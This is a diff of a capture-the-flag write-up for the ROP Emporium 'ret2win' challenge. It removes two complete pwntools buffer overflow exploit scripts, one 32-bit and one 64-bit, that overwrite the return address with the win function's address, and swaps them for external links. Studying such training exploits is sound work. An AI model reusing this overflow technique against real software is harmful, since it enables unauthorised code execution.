@@ -238,125 +238,19 @@ Doing the math i get the offset `0xffbee6ec - 0xffbee6c0 = 0x2c`
 
 I can make the exploit now using pwntools 
 
-```
-from pwn import *
-
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Specify GDB script here (breakpoints etc)
-gdbscript = '''
-init-pwndbg
-continue
-'''.format(**locals())
-
-# Binary filename
-exe = './ret2win'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'info'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-
-# Pass in pattern_size, get back EIP/RIP offset
-offset = 44
-
-# Start program
-io = start()
-
-padding = "A" * offset 
-
-# Build the payload
-payload = flat([
-    padding,
-    0x0804862c
-])
-
-# Send the payload
-io.sendlineafter(b'>', payload)
-
-# Got Flag?
-io.interactive()
-```
+Here's my solve script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ret2win/exploit32.py)
 
 On running it, it works
 
 ```
-┌──(venv)─(mark㉿haxor)-[~/…/Challs/RopEmperium/ret2win/32bits]
-└─$ python2 exploit.py                                
-[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
-[+] Starting local process './ret2win': pid 130172
-[*] Switching to interactive mode
- Thank you!
-Well done! Here's your flag:
-ROPE{a_placeholder_32byte_flag!}
-[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 130172)
-[*] Got EOF while reading in interactive
-[*] Got EOF while sending in interactive
+└─$ python3 exploit.py
+[+] Starting local process './ret2win': pid 107638
+[+] ROPE{a_placeholder_32byte_flag!}
+[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 107638)
 ```
 
-Here's the solve script for the x64 binary
+Here's the solve script for the x64 binary [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/ret2win/exploit64.py)
 
-```
-from pwn import *
-
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Binary filename
-exe = './ret2win'
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'debug'
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-
-# Pass in pattern_size, get back EIP/RIP offset
-offset = 40
-
-# Start program
-io = start()
-
-padding = "A" * offset 
-movaps = 0x000000000040053e  #I had to debug cause there was movap stack allignment
-# Build the payload
-payload = flat([
-    padding,
-    movaps,
-    elf.functions['ret2win']
-])
-
-#write('payload', payload)
-# Send the payload
-io.sendlineafter(b'>', payload)
-
-# Got Flag?
-io.interactive()
-```
 And we're done
 
 <br> <br> 
